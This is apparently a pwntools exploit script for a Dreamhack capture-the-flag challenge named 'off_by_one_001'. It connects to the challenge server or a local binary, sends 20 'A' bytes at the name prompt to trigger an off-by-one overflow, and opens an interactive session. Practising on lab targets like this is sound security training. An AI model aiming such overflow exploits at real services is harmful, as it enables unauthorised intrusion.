#!/usr/bin/env python3
from pwn import *

exe = ELF("./off_by_one_001_patched")

context.binary = exe
context.log_level = "info"


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 15067)
    return r


def main():
    r = conn()
    r.sendlineafter(b"Name: ", b"A" * 20)
    r.interactive()


if __name__ == "__main__":
    main()
